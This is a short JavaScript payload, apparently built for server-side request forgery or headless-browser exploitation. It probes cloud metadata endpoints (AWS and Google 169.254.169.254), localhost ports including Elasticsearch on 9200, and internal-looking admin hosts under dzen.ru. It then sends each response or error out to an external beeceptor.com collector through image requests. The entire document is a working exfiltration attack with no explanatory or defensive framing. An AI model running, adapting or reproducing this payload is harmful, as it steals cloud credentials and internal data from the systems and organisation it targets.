var wh="https://wetakush.free.beeceptor.com";
function x(l,d){new Image().src=wh+"/s-"+l+"?d="+encodeURIComponent(d.substring(0,1500));}
var t=[
["meta","http://169.254.169.254/computeMetadata/v1/?recursive=true"],
["aws","http://169.254.169.254/latest/meta-data/"],
["lo80","http://localhost/"],
["lo8080","http://localhost:8080/"],
["lo9200","http://localhost:9200/"],
["vhadm","http://vh-admin.dzen.ru/"],
["lkpo","http://lkpo.dzen.ru/"]
];
t.forEach(function(e){
fetch(e[1],{mode:"no-cors"}).then(function(r){return r.text().catch(function(){return "s:"+r.status});}).then(function(b){x(e[0],b);}).catch(function(err){x(e[0]+"-e",err.message);});
});
